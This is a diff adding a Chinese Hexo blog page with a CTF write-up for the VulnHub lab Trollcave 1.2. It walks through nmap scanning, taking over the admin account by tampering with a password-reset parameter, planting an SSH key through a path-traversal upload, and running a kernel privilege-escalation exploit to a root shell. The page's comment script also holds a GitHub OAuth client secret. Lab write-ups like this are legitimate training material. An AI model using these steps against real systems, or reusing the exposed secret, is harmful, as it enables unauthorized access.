@@ -1,0 +1,370 @@
+<!doctype html>
+<html lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=11,IE=10,IE=9,IE=8">
+    <meta name="baidu-site-verification" content="dIcXMeY8Ya">
+    
+    <title>[Write-up]-Trollcave: 1.2 | Kali-Team</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
+    <meta name="keywords" content="Kali-Team, 三米前有蕉皮">
+    <meta name="description" content="Kali-Team">
+
+    
+    <link rel="alternative" href="/atom.xml" title="Kali-Team" type="application/atom+xml">
+    
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    
+    <link rel="stylesheet" href="/css/style.css">
+    <!--[if lt IE 9]>
+    <script src="/js/html5.js"></script>
+    <![endif]-->
+    
+
+</head>
+</html>
+<body class="home">
+    <!--[if lt IE 9]>
+    <div class="browsehappy">
+        当前网页 <strong>不支持</strong>
+        你正在使用的浏览器. 为了正常的访问, 请 <a href="http://browsehappy.com/">升级你的浏览器</a>.
+    </div>
+    <![endif]-->
+
+    <!-- 博客头部 -->
+    <header class="header">
+    <section class="container header-main">
+        <div class="logo">
+            <a href="/">
+                <div class="cover">
+                    <span class="name">Kali-Team</span>
+                    <span class="description">三米前有蕉皮</span>
+                </div>
+            </a>
+        </div>
+        <div class="dropnav icon-paragraph-justify" id="JELON__btnDropNav"></div>
+        <ul class="menu hidden" id="JELON__menu">
+            
+            <li rel="/2018/07/16/Write-up-Trollcave-1-2/index.html" class="item ">
+                <a href="/" title="首页" class="icon-home">&nbsp;首页</a>
+            </li>
+            
+            <li rel="/2018/07/16/Write-up-Trollcave-1-2/index.html" class="item ">
+                <a href="/lab/" title="实验室" class="icon-lab">&nbsp;实验室</a>
+            </li>
+            
+            <li rel="/2018/07/16/Write-up-Trollcave-1-2/index.html" class="item ">
+                <a href="/about/" title="关于" class="icon-about">&nbsp;关于</a>
+            </li>
+            
+            <li rel="/2018/07/16/Write-up-Trollcave-1-2/index.html" class="item ">
+                <a href="/comment/" title="留言" class="icon-comment">&nbsp;留言</a>
+            </li>
+            
+        </ul>
+        <div class="profile clearfix">
+            <div class="feeds fl">
+                
+                
+                <p class="links">
+                    
+                        <a href="https://github.com/cn-kali-team" target="_blank">Github</a>
+                        |
+                    
+                </p>
+                <p class="sns">
+                    
+                    <a href="javascript: void(0);" class="wechat">
+                        <b>■</b>
+                        公众号
+                        <span class="popover">
+                            <img src="/img/wechat_mp.jpg" width="120" height="120" alt="我的微信订阅号">
+                            <i class="arrow"></i>
+                        </span>
+                    </a>
+                </p>
+                
+            </div>
+            <div class="avatar fr">
+                <img src="/img/favicon.ico" alt="avatar" title="Kali-Team">
+            </div>
+        </div>
+    </section>
+</header>
+
+
+    <!-- 博客正文 -->
+    <div class="container body clearfix">
+        <section class="content">
+            <div class="content-main widget">
+                <!-- 文章页 -->
+<!-- 文章 -->
+<article class="post article">
+    <header class="text-center">
+        <h3 class="post-title"><span>[Write-up]-Trollcave: 1.2</span></h3>
+    </header>
+    <p class="post-meta text-center">
+        Kali-Team 发表于
+        <time datetime="2018-07-16T14:27:37.000Z">2018-07-16</time>
+    </p>
+    <div class="post-content">
+        <h3 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h3><ul>
+<li>下载地址：<a href="https://download.vulnhub.com/trollcave/trollcave-v1-2.ova" target="_blank" rel="noopener">点我</a></li>
+<li>Flag：root/flag.txt</li>
+<li>哔哩哔哩：<a href="https://www.bilibili.com/video/av27178199/" target="_blank" rel="noopener">视频</a></li>
+</ul>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><ol>
+<li>不知道VM虚拟机怎么啦，导入镜像后，用Nmap扫了，发现不了主机。所以这次用了VBox。</li>
+<li>vboxnet0的IP为192.168.56.130，Nmap扫192.168.56.1/24，发现虚拟机IP为192.168.56.102</li>
+</ol>
+<a id="more"></a>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -A 192.168.56.102</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.01 ( https://nmap.org ) at 2018-07-16 22:38 CST</span><br><span class="line">Nmap scan report for 192.168.56.102</span><br><span class="line">Host is up (0.00041s latency).</span><br><span class="line">Not shown: 998 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 4b:ab:d7:2e:58:74:aa:86:28:dd:98:77:2f:53:d9:73 (RSA)</span><br><span class="line">|_  256 57:5e:f4:77:b3:94:91:7e:9c:55:26:30:43:64:b1:72 (ECDSA)</span><br><span class="line">80/tcp open  http    nginx 1.10.3 (Ubuntu)</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/</span><br><span class="line">|_http-server-header: nginx/1.10.3 (Ubuntu)</span><br><span class="line">|_http-title: Trollcave</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 11.60 seconds</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>发现开了ssh和http就没了。先去看Web的。通过插件看到好像是一个<code>ruby-on-rails</code>框架写的，然后有几篇文章讲关于这个网站的，翻译一下就能知道其中有讲到密码找回的，是新注册的用户才可以的。旁边还有显示在线的用户和新注册的用户。</li>
+<li>随便点开一个用户的主页发现URL是从1~17的数字，17又是新注册的，所以我们猜想1就是管理员用户。</li>
+<li>现在尝试去找回密码，通过Google可以找到这个框架的找回密码的在<code>password_reset</code>后面加new的。详细的可以点<a href="https://www.railstutorial.org/book/password_reset" target="_blank" rel="noopener">这里</a>看一下。</li>
+<li>打开<code>http://192.168.56.102/password_resets/new</code>输入管理员用户King发现不行，因为在上面说了，新注册的用户才可以找回密码。再输入xer这个新注册的用户。</li>
+<li>然后有一段提示：<code>Reset email sent. http://192.168.56.102/password_resets/edit.Ec80xGP57IiFEzBpAtx4AQ?name=xer</code>把name的参数改成管理员用户King，发现可以改掉管理员的密码，改了之后登录管理员看看。</li>
+<li>有可以上传文件的<code>http://192.168.56.102/user_files</code>还有可以开启上传文件的选项。</li>
+<li>这里还有服务器的物理路径<code>/var/www/trollcave/public/uploads/King/crown.png</code></li>
+<li>这个框架会新建一个<strong>rails</strong>的用户给Web服务。所以我们打算上传一个shh的公钥，这样就可以直接用ssh连接服务器了。就是上传到<strong>../../../../../../home/rails/.ssh/authorized_keys</strong>，然后ssh <a href="mailto:rails@192.168.56.102" target="_blank" rel="noopener">rails@192.168.56.102</a>连上。</li>
+</ol>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><ol>
+<li>老套路<code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code>获取交互终端。</li>
+<li><code>lsb_release -a</code>查看系统的发行版本，准备exp</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">rails@trollcave:~$ lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID:	Ubuntu</span><br><span class="line">Description:	Ubuntu 16.04.4 LTS</span><br><span class="line">Release:	16.04</span><br><span class="line">Codename:	xenial</span><br><span class="line">rails@trollcave:~$ </span><br><span class="line">rails@trollcave:~$ uname -a</span><br><span class="line">Linux trollcave 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>搜搜exp：searchsploit 4.4.0-116，编译上传到目标主机。</li>
+</ol>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">----------------------------------------------------------------------------------------------------------------------------------------------- -----------------------------------------</span></span><br><span class="line"> Exploit Title                                                                                                                                 |  Path</span><br><span class="line">                                                                                                                                               | (/opt/exploit-database/)</span><br><span class="line"><span class="comment">----------------------------------------------------------------------------------------------------------------------------------------------- -----------------------------------------</span></span><br><span class="line">Linux Kernel &lt; <span class="number">4.4</span><span class="number">.0</span><span class="number">-116</span> (Ubuntu <span class="number">16.04</span><span class="number">.4</span>) - Local Privilege Escalation                                                                         | exploits/linux/<span class="built_in">local</span>/<span class="number">44298.</span>c</span><br><span class="line"><span class="comment">----------------------------------------------------------------------------------------------------------------------------------------------- -----------------------------------------</span></span><br><span class="line">Shellcodes: No Result</span><br><span class="line">Papers: No Result</span><br><span class="line"></span><br><span class="line">cp /opt/exploit-database/exploits/linux/<span class="built_in">local</span>/<span class="number">44298.</span>c <span class="built_in">exp</span>.c</span><br><span class="line">gcc <span class="built_in">exp</span>.c</span><br><span class="line">scp <span class="keyword">a</span>.out rails@<span class="number">192.168</span><span class="number">.56</span><span class="number">.102</span>:<span class="keyword">a</span>.out</span><br></pre></td></tr></table></figure>
+<ol start="4">
+<li>加权限执行，拿到root权限，完事！</li>
+</ol>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">rails<span class="variable">@trollcave</span><span class="symbol">:~</span><span class="variable">$ </span>ls</span><br><span class="line">rails<span class="variable">@trollcave</span><span class="symbol">:~</span><span class="variable">$ </span>pwd</span><br><span class="line">/home/rails</span><br><span class="line">rails<span class="variable">@trollcave</span><span class="symbol">:~</span><span class="variable">$ </span>ls</span><br><span class="line">a.out</span><br><span class="line">rails<span class="variable">@trollcave</span><span class="symbol">:~</span><span class="variable">$ </span>chmod +x a.out </span><br><span class="line">rails<span class="variable">@trollcave</span><span class="symbol">:~</span><span class="variable">$ </span>./a.out </span><br><span class="line">task_struct = ffff880027d29e0<span class="number">0</span></span><br><span class="line">uidptr = ffff88002ac26844</span><br><span class="line">spawning root shell</span><br><span class="line">root<span class="variable">@trollcave</span><span class="symbol">:~</span><span class="comment"># </span></span><br><span class="line">root<span class="variable">@trollcave</span><span class="symbol">:/root</span><span class="comment"># cat flag.txt </span></span><br><span class="line">et tu, dragon?</span><br><span class="line"></span><br><span class="line">c0db34ce8adaa7c07d064cc1697e3d7cb8aec9d5a0c4809d5a0c4809b6be23044d15379c5</span><br><span class="line">root<span class="variable">@trollcave</span><span class="symbol">:/root</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+    </div>
+    <p class="post-meta">
+        <span class="post-cat">分类：
+            <a class="cat-link" href="/categories/CTF/">CTF</a>
+        </span>
+        <span class="post-tags">
+            标签：
+            
+    
+        <a href="/tags/CTF/" title="CTF">CTF</a>
+    
+
+        </span>
+    </p>
+</article>
+<!-- 分享按钮 -->
+
+
+<!-- 上一篇/下一篇 -->
+
+<div class="article-nav clearfix">
+    
+    <span class="prev fl">
+        上一篇<br>
+        <a href="/2018/08/06/Write-up-Violator/">
+            
+                Write-up-Violator
+            
+        </a>
+    </span>
+    
+
+    
+    <span class="next fr">
+        下一篇<br>
+        <a href="/2018/07/10/Write-up-pwnlab-init/">
+            
+                [Write-up]-pwnlab_init
+            
+        </a>
+    </span>
+    
+</div>
+
+<!-- 文章评论 -->
+
+  <script src="/js/comment.js"></script>
+  <div id="comments" class="comment">
+    <!--
+    <div class="sign-bar">
+      GitHub 已登录!
+      <span class="sign-link">登出</span>
+    </div>
+    <section class="box">
+      <div class="com-avatar"><img src="/img/favicon.ico" alt="avatar"></div>
+      <div class="com-text">
+        <div class="main">
+          <textarea class="text-area-edited show" placeholder="欢迎评论！"></textarea>
+          <div class="text-area-preview"></div>
+        </div>
+        <div class="switch">
+          <div class="switch-item on">编辑</div>
+          <div class="switch-item">预览</div>
+        </div>
+        <div class="button">提交</div>
+      </div>
+    </section>
+    <section class="tips">注：评论支持 markdown 语法！</section>
+    <section class="list-wrap">
+      <ul class="list">
+        <li>
+          <div class="user-avatar">
+            <a href="/">
+              <img src="/img/favicon.ico" alt="user-avatar">
+            </a>
+          </div>
+          <div class="user-comment">
+            <div class="user-comment-header">
+              <span class="post-name">张德龙</span>
+              <span class="post-time">2017年12月12日</span>
+              <span class="like liked">已赞</span>
+              <span class="like-num">2</span>
+            </div>
+            <div class="user-comment-body">333333</div>
+          </div>
+        </li>
+        <li>
+          <div class="user-avatar">
+            <a href="/">
+              <img src="/img/favicon.ico" alt="user-avatar">
+            </a>
+          </div>
+          <div class="user-comment">
+            <div class="user-comment-header">
+              <span class="post-name">刘德华</span>
+              <span class="post-time">2017年12月12日</span>
+              <span class="like">点赞</span>
+              <span class="like-num">2</span>
+            </div>
+            <div class="user-comment-body">vvvvv</div>
+          </div>
+        </li>
+      </ul>
+      <div class="page-nav">
+        <a href="javascript: void(0);" class="item">1</a>
+        <a href="javascript: void(0);" class="item">2</a>
+        <a href="javascript: void(0);" class="item current">3</a>
+      </div>
+    </section>
+    -->
+  </div>
+  <script>
+  JELON.Comment({
+    container: 'comments',
+    label: 'Write-up-Trollcave-1-2' || '2018/07/16/Write-up-Trollcave-1-2/',
+    owner: 'cn-kali-team',
+    repo: 'cn-kali-team.github.io',
+    clientId: '0683bca9d762208912a9',
+    clientSecret: 'fd3e06918ff647fd4b347dfeba033b588a957fc5'
+  });
+  </script>
+
+
+            </div>
+
+        </section>
+        <!-- 侧栏部分 -->
+<aside class="sidebar">
+    <section class="widget">
+        <h3 class="widget-hd"><strong>文章分类</strong></h3>
+        <!-- 文章分类 -->
+<ul class="widget-bd">
+    
+    <li>
+        <a href="/categories/Arch/">Arch</a>
+        <span class="badge">(1)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/工具/">工具</a>
+        <span class="badge">(1)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/CTF/">CTF</a>
+        <span class="badge">(11)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/Web/">Web</a>
+        <span class="badge">(1)</span>
+    </li>
+    
+</ul>
+    </section>
+
+    
+    <section class="widget">
+        <h3 class="widget-hd"><strong>热门标签</strong></h3>
+        <!-- 文章标签 -->
+<div class="widget-bd tag-wrap">
+  
+    <a class="tag-item" href="/tags/Arch/" title="Arch">Arch (1)</a>
+  
+    <a class="tag-item" href="/tags/Genymotion/" title="Genymotion">Genymotion (1)</a>
+  
+    <a class="tag-item" href="/tags/CTF/" title="CTF">CTF (11)</a>
+  
+    <a class="tag-item" href="/tags/XSS/" title="XSS">XSS (1)</a>
+  
+    <a class="tag-item" href="/tags/web/" title="web">web (1)</a>
+  
+    <a class="tag-item" href="/tags/Linux/" title="Linux">Linux (1)</a>
+  
+    <a class="tag-item" href="/tags/nmap/" title="nmap">nmap (1)</a>
+  
+    <a class="tag-item" href="/tags/metasploit/" title="metasploit">metasploit (1)</a>
+  
+</div>
+    </section>
+    
+
+    
+
+    
+    <!-- 友情链接 -->
+    <section class="widget">
+        <h3 class="widget-hd"><strong>友情链接</strong></h3>
+        <!-- 文章分类 -->
+<ul class="widget-bd">
+    
+        <li>
+            <a href="https://gh0st.cn/" target="_blank" title="陈的博客">VulKey</a>
+        </li>
+    
+        <li>
+            <a href="https://10miaomiao.cn/" target="_blank" title="10喵喵的世界">飞跃</a>
+        </li>
+    
+        <li>
+            <a href="http://www.zmnihao.cn/" target="_blank" title="梓铭你好">梓铭</a>
+        </li>
+    
+</ul>
+    </section>
+    
+</aside>
+<!-- / 侧栏部分 -->
+    </div>
+
+    <!-- 博客底部 -->
+    <footer class="footer">
+    &copy;
+    
+        2016-2019
+    
+</footer>
+<div class="back-to-top" id="JELON__backToTop" title="返回顶部">返回顶部</div>
+
+    <!--博客js脚本 -->
+    <!-- 这里放网站js脚本 -->
+<script src="/js/main.js"></script>
+</body>
+</html>
